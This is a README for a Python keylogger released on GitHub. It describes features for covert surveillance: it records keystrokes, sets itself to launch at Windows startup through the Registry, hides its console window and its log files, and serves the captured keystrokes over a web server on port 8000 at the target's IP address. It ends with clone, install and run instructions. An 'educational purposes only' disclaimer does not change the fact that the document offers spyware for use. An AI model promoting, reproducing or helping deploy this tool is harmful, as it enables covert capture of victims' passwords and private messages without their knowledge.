# keylogger

**Coded By WASSELD**

This is a  keylogger tool made in python 

---

### Reminder

This project is for educational and learning purposes only. It is not intended to be used for any illegal activities and I'm not responsible for any misuse or damage caused by it.

---

##  Features

- Keystroke Logging: Records keyboard inputs to a text file (kl.txt).
- Persistence: Edits the Windows Registry to automatically launch itself at system startup.
- Stealth: Uses Windows API calls to hide its console window and marks its data folder/logs as hidden files.
- Runs a web server on port 8000,You can download the logs by visiting the target's IP address (e.g., http://<target_ip>:8000).

---

## Installation

```bash

git clone https://github.com/WasselD/keylogger.git

cd KL

# (Recommended) create virtual environment

python3 -m venv venv

# activate virtual environment
# Linux / macOS

source venv/bin/activate

# Windows

venv\Scripts\activate

# install dependencies

pip install -r requirements.txt

# run the tool

python KL.py
